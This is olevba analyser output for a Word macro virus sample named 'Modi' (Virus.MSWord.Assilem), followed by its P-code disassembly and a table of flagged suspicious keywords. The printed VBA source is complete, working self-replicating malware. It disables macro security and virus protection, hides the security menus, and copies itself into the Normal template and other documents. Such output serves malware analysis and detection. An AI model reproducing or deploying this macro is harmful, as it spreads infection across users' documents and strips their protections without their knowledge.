olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Assilem
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Modi.cls 
in file: ./Virus.MSWord.Assilem - OLE stream: 'Macros/VBA/Modi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set activdoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set nrmtemp = NormalTemplate.VBProject.VBComponents.Item(1)
nrmbaris = nrmtemp.CodeModule.CountOfLines
docbaris = activdoc.CodeModule.CountOfLines
mulai = 2
If activdoc.Name <> "Modi" Then
If docbaris > 0 Then _
activdoc.CodeModule.DeleteLines 1, docbaris
Set ToInfect = activdoc
activdoc.Name = "Modi"
activmulai = True
End If
If nrmtemp.Name <> "Modi" Then
If nrmbaris > 0 Then _
nrmtemp.CodeModule.DeleteLines 1, nrmbaris
Set ToInfect = nrmtemp
nrmtemp.Name = "Modi"
nrmlmulai = True
End If
If nrmlmulai <> True And activmulai <> True Then GoTo byeah
If nrmlmulai = True Then
Do While activdoc.CodeModule.Lines(1, 1) = ""
activdoc.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While activdoc.CodeModule.Lines(mulai, 1) <> ""
ToInfect.CodeModule.InsertLines mulai, activdoc.CodeModule.Lines(mulai, 1)
mulai = mulai + 1
Loop
End If
If activmulai = True Then
Do While nrmtemp.CodeModule.Lines(1, 1) = ""
nrmtemp.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While nrmtemp.CodeModule.Lines(mulai, 1) <> ""
ToInfect.CodeModule.InsertLines mulai, nrmtemp.CodeModule.Lines(mulai, 1)
mulai = mulai + 1
Loop
End If
byeah:
'Modi virus use tech of mellisa made by drdara
If nrmbaris <> 0 And docbaris = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = 13 And Month(Now) = 9 Then MsgBox ("you infected by Modi virus")
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Assilem
' ===============================================================================
' Module streams:
' Macros/VBA/Modi - 7619 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	ElseBlock 
' Line #6:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activdoc 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nrmtemp 
' Line #11:
' 	Ld nrmtemp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nrmbaris 
' Line #12:
' 	Ld activdoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St docbaris 
' Line #13:
' 	LitDI2 0x0002 
' 	St mulai 
' Line #14:
' 	Ld activdoc 
' 	MemLd New 
' 	LitStr 0x0004 "Modi"
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LineCont 0x0004 05 00 00 00
' 	Ld docbaris 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld docbaris 
' 	Ld activdoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #16:
' 	SetStmt 
' 	Ld activdoc 
' 	Set ToInfect 
' Line #17:
' 	LitStr 0x0004 "Modi"
' 	Ld activdoc 
' 	MemSt New 
' Line #18:
' 	LitVarSpecial (True)
' 	St activmulai 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld nrmtemp 
' 	MemLd New 
' 	LitStr 0x0004 "Modi"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LineCont 0x0004 05 00 00 00
' 	Ld nrmbaris 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld nrmbaris 
' 	Ld nrmtemp 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #22:
' 	SetStmt 
' 	Ld nrmtemp 
' 	Set ToInfect 
' Line #23:
' 	LitStr 0x0004 "Modi"
' 	Ld nrmtemp 
' 	MemSt New 
' Line #24:
' 	LitVarSpecial (True)
' 	St nrmlmulai 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld nrmlmulai 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld activmulai 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo byeah 
' 	EndIf 
' Line #27:
' 	Ld nrmlmulai 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld activdoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld activdoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #30:
' 	Loop 
' Line #31:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #32:
' 	Ld mulai 
' 	LitDI2 0x0001 
' 	Ld activdoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #33:
' 	Ld mulai 
' 	Ld mulai 
' 	LitDI2 0x0001 
' 	Ld activdoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	Ld mulai 
' 	LitDI2 0x0001 
' 	Add 
' 	St mulai 
' Line #35:
' 	Loop 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld activmulai 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nrmtemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld nrmtemp 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #40:
' 	Loop 
' Line #41:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #42:
' 	Ld mulai 
' 	LitDI2 0x0001 
' 	Ld nrmtemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #43:
' 	Ld mulai 
' 	Ld mulai 
' 	LitDI2 0x0001 
' 	Ld nrmtemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	Ld mulai 
' 	LitDI2 0x0001 
' 	Add 
' 	St mulai 
' Line #45:
' 	Loop 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Label byeah 
' Line #48:
' 	QuoteRem 0x0000 0x002D "Modi virus use tech of mellisa made by drdara"
' Line #49:
' 	Ld nrmbaris 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld docbaris 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #53:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001A "you infected by Modi virus"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #54:
' 	EndSub 
' Line #55:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

